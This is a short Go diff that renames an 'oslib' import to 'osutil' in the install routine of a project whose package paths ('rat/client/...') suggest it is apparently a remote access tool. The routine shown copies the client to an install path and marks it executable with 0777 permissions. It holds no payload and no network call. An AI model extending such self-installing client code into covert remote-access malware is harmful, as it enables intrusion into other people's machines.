@@ -3,7 +3,7 @@ package install
 import (
 	"io"
 	"os"
-	"oslib"
+	"osutil"
 	"path/filepath"
 	"rat/client/computer"
 	"rat/shared/installpath"
@@ -37,7 +37,7 @@ func getCurrent() string {
 }
 
 func Install(name string, p installpath.Path) (string, error) {
-	if oslib.Name == oslib.Windows {
+	if osutil.Name == osutil.Windows {
 		name += ".exe"
 	}
 
@@ -45,7 +45,7 @@ func Install(name string, p installpath.Path) (string, error) {
 
 	out, err := os.Create(file)
 
-	if oslib.Name != oslib.Windows {
+	if osutil.Name != osutil.Windows {
 		out.Chmod(0777)
 	}
 
